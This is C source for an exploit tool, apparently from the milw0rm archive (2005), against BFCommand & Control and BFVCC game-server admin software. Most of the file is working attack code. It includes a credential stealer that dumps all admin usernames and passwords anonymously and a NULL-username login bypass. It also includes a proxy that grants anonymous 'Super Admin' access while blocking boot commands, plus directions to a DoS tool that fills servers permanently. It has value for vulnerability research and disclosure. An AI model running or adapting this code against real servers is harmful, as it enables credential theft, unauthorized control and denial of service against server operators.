/*

by Luigi Auriemma

http://aluigi.altervista.org/fakep/tcpfp.zip

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define PORT        5555
#define MYPORT      3333
#define BUFFSZ      8192
#define DEL         0x1e
#define END         "\x00\x40\x40\x00"



void proxy(int sock, u_char *buff, int size);
int check_drop(u_char *data);
void show_bfcc(u_char *buff, int len);
void send_bfcc(int sock, ...);
int recv_bfcc(int sock, u_char *buff, int size);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            scan = 3;
    u_short port = PORT;
    u_char  buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "BFCommand & Control login bypass "VER"\n"
        "  BFCC  <= 1.22_A\n"
        "  BFVCC <= 2.14_B\n"
        "  BFVCCDaemon is NOT vulnerable\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            " 1 = passwords stoler, sends the GetUserAccounts anonymously and gets all the\n"
            "     usernames and passwords in the server manager (bug A)\n"
            " 2 = checks if is possible to bypass the login using a NULL username (bug B)\n"
            " 3 = proxy server to use with BFC3 and BFVC3 clients which grants access to any\n"
            "     vulnerable server in total anonymity and unbootable (bug A and C)\n"
            " 4 = explanation of how test bug D, server full forever\n"
            "\n"
            " Note: The default port of BFCC is 4555 while is 5555 for BFVCC (default)\n"
            "       This tool has been written to be compatible with BFVCC so only attack 1\n"
            "       and 4 can be used with success versus BFCC using this specific tool\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if((attack < 1) || (attack > 4)) {
        fputs("\nError: you must choose a number between the range of available attacks\n\n", stdout);
        exit(1);
    }
    if(attack == 4) {
        fputs("\n"
            "Download the tool \"Generic TCP Fake Players DoS\" from here:\n"
            "\n"
            "  http://aluigi.altervista.org/fakep/tcpfp.zip\n"
            "\n"
            "Launch it with the following arguments\n"
            "\n"
            "  tcpfp -r full 127.0.0.1 5555\n"
            "\n"
            "substituiting 127.0.0.1 and 5555 with the server and port of the server you\n"
            "want to test.\n"
            "\n", stdout);
        return(0);
    }

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    while(scan--) {
        printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);
        len = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
        if(!len) break;
        fputs("  no service available on this port\n", stdout);
        peer.sin_port = htons(++port);
    }
    if(len < 0) std_err();

    if(attack == 1) {
        fputs("- receive server's informations:\n", stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

        fputs("- send anonymous GetUserAccounts commands\n", stdout);
        send_bfcc(sd, "GetUserAccounts", NULL);

        fputs(
            "- receive full list of admin usernames and passwords\n"
            "  Username   Password:\n", stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

    } else if(attack == 2) {
        fputs("- receive server's informations:\n", stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

        fputs("- send login command with NULL nickname\n", stdout);
        send_bfcc(sd,
            "login",
            "\0",   // BUG exploited here
            "password",
            "username",
            "???",
            "",
            NULL);

        fputs("- check for success message:\n", stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

    } else if(attack == 3) {
        proxy(sd, buff, BUFFSZ);
    }

    close(sd);
    free(buff);
    return(0);
}



void proxy(int sock, u_char *buff, int size) {
    struct  sockaddr_in peer;
    fd_set  readset;
    int     sdl,
            sda,
            on = 1,
            len,
            psz,
            selsock;

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(MYPORT);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf("- bind port %hu\n", MYPORT);

    sdl = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sdl < 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sdl, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(listen(sdl, SOMAXCONN)
      < 0) std_err();

    printf("- launch BFC3 or BFVC3 and sets %s as server and %hu as port\n",
        "127.0.0.1", MYPORT);

    sda = accept(sdl, (struct sockaddr *)&peer, &psz);
    if(sda < 0) std_err();

    printf("- connected\n");

    send_bfcc(sda,  // enable everything
        "master",
        "null/null/null/0/Map_True/"
        "Action-Warn"                           "\xff" "1" "\xff"
        "Action-Kick"                           "\xff" "1" "\xff"
        "Action-Insta-Kick (No Reason)"         "\xff" "1" "\xff"
        "Action-Ban"                            "\xff" "1" "\xff"
        "Action-Insta-Ban (No Reason)"          "\xff" "1" "\xff"
        "Action-Remove Ban"                     "\xff" "1" "\xff"
        "Action-Clear Banlist"                  "\xff" "1" "\xff"
        "Action-Force to Other Team"            "\xff" "1" "\xff"
        "Action-Kill Player"                    "\xff" "1" "\xff"
        "Action-Send Message to Server"         "\xff" "1" "\xff"
        "Game-Pause"                            "\xff" "1" "\xff"
        "Game-Toggle Auto-Balance"              "\xff" "1" "\xff"
        "Action-Request PB Screenshot"          "\xff" "1" "\xff"
        "BFVC3-Maps Change Maps"                "\xff" "1" "\xff"
        "BFVC3-Maps Change 2 Map NOT in "       "\xff" "1" "\xff"
        "BFVC3-Maps Restart Map"                "\xff" "1" "\xff"
        "BFVC3-Maps Set Next Map"               "\xff" "1" "\xff"
        "BFVC3-Admin Change Server Settings"    "\xff" "1" "\xff"
        "BFVC3-Admin Change FF Settings"        "\xff" "1" "\xff"
        "BFVC3-Admin Change Misc Settings"      "\xff" "1" "\xff"
        "BFVC3-Admin Change Voting Settings"    "\xff" "1" "\xff"
        "USERS-Access User Accounts"            "\xff" "1" "\xff"
        "USERS-Edit User Profiles"              "\xff" "1" "\xff"
        "USERS-Create User"                     "\xff" "1" "\xff"
        "USERS-Edit User"                       "\xff" "1" "\xff"
        "USERS-Delete User"                     "\xff" "1" "\xff"
        "BFVCC-Access Manager Control Panel"    "\xff" "1" "\xff"
        "BFVCC-Access to Auto Admin Settings"   "\xff" "1" "\xff"
        "BFVCC-Load Manager Profiles"           "\xff" "1" "\xff"
        "BFVCC-Save Changes to Profiles"        "\xff" "1" "\xff"
        "BFVCC-Create Manager Profiles"         "\xff" "1" "\xff"
        "BFVCC-Delete Manager Profiles"         "\xff" "1" "\xff"
        "CC-Access the CC Editor"               "\xff" "1" "\xff"
        "CC-Save Changes to CC Profiles"        "\xff" "1" "\xff"
        "CC-Create new CC Profiles"             "\xff" "1" "\xff"
        "CC-Delete CC Profile"                  "\xff" "1" "\xff"
        "CC-Change a Maps CC Profile"           "\xff" "1" "\xff"
        "PB-Edit PB Config Files"               "\xff" "1" "\xff",
        "15567",                                // default server port (useless)
        "admin"                                 "\xff", // username    (useless)
        "True",
        "Super Admin",                          // profile
        "0",
        NULL);

    selsock = ((sock > sda) ? sock : sda) + 1;

    for(;;) {
        FD_ZERO(&readset);
        FD_SET(sock, &readset);
        FD_SET(sda, &readset);
        if(select(selsock, &readset, NULL, NULL, NULL)
          < 0) std_err();

        if(FD_ISSET(sda, &readset)) {
            len = recv_bfcc(sda, buff, size);
            fwrite(buff, len, 1, stdout);

            if(check_drop(buff)) continue;

            len = send(sock, buff, len, 0);
            if(len < 0) std_err();
        }

        if(FD_ISSET(sock, &readset)) {
            len = recv_bfcc(sock, buff, size);
            fwrite(buff, len, 1, stdout);

            if(check_drop(buff)) continue;

            len = send(sda, buff, len, 0);
            if(len < 0) std_err();
        }
    }

    close(sda);
    close(sdl);
}



int check_drop(u_char *cmd) {
    int     i;
    u_char  *p,
            *drop[] = {
                "login",
                "Boot",
                "loginfailed",
                NULL
            };

    p = strchr(cmd, DEL);
    if(!p) {
        p = strchr(cmd, END[0]);
        if(!p) return(0);
    }

    for(i = 0; drop[i]; i++) {
        if(!strncmp(cmd, drop[i], p - cmd)) return(1);
    }

    return(0);
}



void show_bfcc(u_char *buff, int len) {
    u_char  *p,
            *l,
            *limit = buff + len;

    for(p = buff; p < limit; p = l + 1) {
        for(l = p; *l != DEL; l++) {
            if(!memcmp(l, END, 4)) return;
            if(!memcmp(l, "|;|", 3)) {
                if(*(l - 1) == '\t') *(l - 1) = ' ';
                memcpy(l, "\n  ", 3);
            }
        }
        *l = 0;
        printf("  %s\n", p);
    }
}



void send_bfcc(int sock, ...) { // final NULL required
    va_list ap;
    int     len;
    u_char  *s;

    va_start(ap, sock);

    s = va_arg(ap, u_char *);
    if(s) {
        for(;;) {
            len = strlen(s);
            if(!len) len++;
            send(sock, s, len, 0);
            s = va_arg(ap, u_char *);
            if(!s) break;
            send(sock, "\x1e", 1, 0);
        }
    }

    va_end(ap);

    send(sock, END, 4, 0);
}



int recv_bfcc(int sock, u_char *buff, int size) {
    int     len = 0;

        // one command at time, slower but better
    while(len < size) {
        if(recv(sock, buff + len, 1, 0) <= 0) {
            fputs("\nError: connection interrupted\n\n", stdout);
            exit(1);
        }
        len++;
        if(!memcmp(buff + len - 4, END, 4)) break;
    }

    if(len == size) {
        fputs("\nError: command too long\n\n", stdout);
        exit(1);
    }

    return(len);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-08-29]
